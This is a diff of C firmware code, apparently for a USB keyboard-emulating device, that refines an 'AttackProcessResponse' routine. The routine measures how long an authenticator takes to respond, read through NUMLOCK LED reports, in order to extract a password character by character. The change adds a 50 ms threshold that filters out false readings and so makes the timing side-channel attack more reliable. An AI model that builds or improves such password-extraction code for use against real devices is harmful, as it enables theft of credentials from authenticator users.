@@ -344,15 +344,22 @@ static void findBestTimeAndExtractPasswordChar(void)
 	memset(timings, 0, sizeof(timings));
 }
 
-// Process LED response for timing measurement (like ref.c approach)
+// Process LED response for timing measurement
 void AttackProcessResponse(uint8_t* led_report)
 {
-	// Check if NUMLOCK is ON - this signals authenticator response (same as ref.c)
-	if ((*led_report & HID_KEYBOARD_LED_NUMLOCK) && waiting_for_response)
+	uint8_t numlock_on = (*led_report & HID_KEYBOARD_LED_NUMLOCK) ? 1 : 0;
+
+	if (waiting_for_response)
 	{
-		uint32_t end_time = timer_ms;
-		timings[curr_char_id++] = end_time - start_time;
-		waiting_for_response = false;
+		// Only record if NUMLOCK is ON AND enough time has passed (>50ms)
+		// This prevents false triggers when NUMLOCK was already ON from previous round
+		// Authenticator responses take at least 50-100ms for wrong chars, longer for correct
+		uint32_t elapsed = timer_ms - start_time;
+		if (numlock_on && elapsed > 50)
+		{
+			timings[curr_char_id++] = elapsed;
+			waiting_for_response = false;
+		}
 	}
 }
 
